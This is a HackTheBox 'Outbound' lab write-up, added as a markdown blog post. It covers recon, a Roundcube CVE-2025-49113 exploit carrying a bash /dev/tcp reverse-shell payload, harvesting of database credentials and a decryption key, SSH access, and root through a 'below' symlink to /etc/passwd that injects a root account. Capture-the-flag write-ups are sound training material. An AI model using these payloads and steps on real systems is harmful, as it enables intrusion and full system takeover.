@@ -1,0 +1,161 @@
+---
+title: "Outbound HacktheBox Writeup"
+date: "Jul 29, 2025"
+description: "Detailed writeup for Outbound HacktheBox"
+image: "/images/outbound.png"
+---
+
+ 🚀 Introduction
+
+In this challenge, we first Exploring a webmail service and exploiting a known vulnerability that allowed us to gain initial access. After obtaining a user account, we looked deeper into the server and found another security issue that let us escalate our privileges to become the root user, giving full control of the machine. This walkthrough details each step clearly, making it easy to follow even for beginners
+
+Let's dive right in and start solving this interesting machine:-
+
+Returning to HackTheBox after a long break, I discovered an intriguing new machine—Outbound. Eager to dust off my hacking skills, I quickly jumped into action by setting up the VPN connection:
+
+sudo openvpn outbound.ovpn
+
+🔍 Reconnaissance
+
+Next, I performed an Nmap scan:
+
+```bash
+nmap -sC -sV -oN scan.txt 10.10.11.77
+```
+I identified two open ports:
+![namp](/outbound.png)
+
+
+22 (SSH)
+
+80 (HTTP)
+
+🌐 Web Enumeration
+
+Visiting http://10.10.11.77 redirected me to mail.outbound.htb, prompting me to update my /etc/hosts file:
+
+```bash
+10.10.11.77 mail.outbound.htb
+```
+After refreshing the page, I found a Roundcube webmail login with provided credentials directly on the page.
+![machine](/htb.png)
+
+Logging in, I immediately noticed the Roundcube version had a known vulnerability (CVE-2025-49113).
+
+Quick reminder: Always check software versions for known CVEs!
+
+🛠️ Exploitation
+
+I set up a listener on my attacker machine:
+```bash
+nc -nlvp 4444
+```
+Then, I cloned and executed the exploit:
+```bash
+git clone https://github.com/fearsoff-org/CVE-2025-49113.git
+cd CVE-2025-49113
+php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1'"
+```
+The exploit executed successfully, giving me a shell as www-data.
+
+![www-data](/htb2.png)
+
+📂 Exploring Files
+
+Navigating the server, I discovered a crucial config directory:
+
+/var/www/html/roundcube/public_html/roundcube/config
+
+Inside config.inc.php, 
+
+![Image](/config.png)
+
+I found database credentials:
+
+```bash
+DB User: roundcube
+DB Pass: RCDBPass2025
+DB Name: roundcube
+```
+💾 Database Exploration
+
+With the credentials, I accessed the database:
+```bash
+mysql -u roundcube -pRCDBPass2025 roundcube
+SHOW TABLES;
+SELECT * FROM session;
+```
+The session data was Base64-encoded. Decoding using CyberChef.io,
+![Base64](/sessions.png)
+
+I initially found Tyler’s credentials (already known), then Jacob’s encrypted session data.
+
+Jacob's password was encrypted using Triple DES (DES-EDE3-CBC). Leveraging the encryption key (rcmail-!24ByteDESkey*Str) from config.inc.php, I decrypted Jacob’s password successfully.
+![decode](/decode.png)
+🔑 SSH Access
+
+With Jacob’s decrypted password, 
+
+![jacobpass](/jacobpass.png)
+
+I accessed via SSH:
+```bash
+ssh jacob@10.10.11.77
+```
+Jacob's SSH password:
+
+gY4Wr3a1evp4
+
+Successfully obtained the user flag.
+
+![userflag](/userflag.png)
+
+🛡️ Privilege Escalation
+
+Checking Jacob’s privileges:
+```bash
+sudo -l
+```
+
+Output:
+```bash
+(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+```
+Jacob could run /usr/bin/below as root, excluding certain arguments.
+
+Searching vulnerabilities related to /usr/bin/below, I discovered CVE-2025-27591, allowing arbitrary file manipulation through logs. I executed the following steps:
+
+Exploit Steps:
+
+Navigate to log directory:
+```bash
+cd /var/log/below
+```
+Create a malicious user entry:
+```bash
+echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
+```
+Remove original log file:
+```bash
+rm error_root.log
+```
+Create a symbolic link to /etc/passwd:
+```bash
+ln -s /etc/passwd /var/log/below/error_root.log
+```
+Trigger vulnerability:
+```bash
+sudo /usr/bin/below
+```
+Overwrite /etc/passwd:
+```bash
+cp root2 error_root.log
+```
+Switch to root-level user:
+```bash
+su root2
+```
+![rootq](/root.png)
+
+Root access achieved. 🎉 Successfully obtained the root flag!
+[![Outbound Machine Achievement](/machine.png)](https://labs.hackthebox.com/achievement/machine/205810/672)
